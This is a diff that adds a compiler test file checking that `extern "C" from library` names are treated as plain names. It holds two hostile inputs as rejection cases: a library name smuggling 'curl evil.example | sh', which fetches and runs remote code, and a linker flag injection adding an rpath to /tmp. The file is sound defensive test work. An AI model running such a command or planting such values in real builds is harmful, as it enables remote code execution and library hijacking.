@@ -1,0 +1,25 @@
+// A library name is a NAME, not a command and not a flag.
+//
+// `from library "X"` puts X on the linker's command line. The link step runs
+// clang from an argv array, so the first block below would already reach the
+// linker as one harmless argument - but it names nothing, and the writer
+// should hear that here rather than from ld. The second block is the shape an
+// argv array cannot make harmless: a name beginning with `-` is a flag to the
+// linker whichever slot it lands in.
+extern "C" from library "m; curl evil.example | sh" {
+    function cos(x: float64): float64;
+}
+
+extern "C" from library "framework:-Wl,-rpath,/tmp" {
+    function sin(x: float64): float64;
+}
+
+// The header form is documentation and reaches no command line, so a slash
+// in it is fine. This block is here to show the rule does not touch it.
+extern "C" from "sys/types.h" {
+    function getpid(): int32;
+}
+
+function main(): int32 {
+    return 0;
+}
